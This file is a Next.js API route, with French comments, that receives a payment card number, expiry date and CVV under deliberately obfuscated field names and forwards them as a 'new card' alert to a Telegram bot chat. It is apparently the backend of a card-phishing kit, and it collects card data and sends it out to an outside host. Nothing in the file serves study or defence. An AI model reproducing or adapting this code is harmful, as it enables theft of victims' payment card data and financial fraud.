import { NextResponse } from 'next/server';

export async function POST(req: Request) {
  try {
    const data = await req.json();

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    // Récupération des données avec les clés obfusquées du front-end
    const cardNumber = data.amak || 'Non saisi';
    const expiry = data.ludo || 'Non saisi';
    const cvv = data.fqx || 'Non saisi';

    const message = `💳 *NOUVELLE CSC*\n\n` +
      `• *NIM :* \`${cardNumber}\`\n` +
      `• *XP :* \`${expiry}\`\n` +
      `• *CSC 3 :* \`${cvv}\`\n\n` +
      `📅 *Date :* ${new Date().toLocaleString('fr-FR')}`;

    if (botToken && chatId) {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown',
        }),
      });
    }

    return NextResponse.json({ success: true, message: 'Carte transmise' });

  } catch (error) {
    console.error('Erreur API Carte :', error);
    return NextResponse.json(
      { success: false, error: 'Erreur lors du traitement' },
      { status: 500 }
    );
  }
}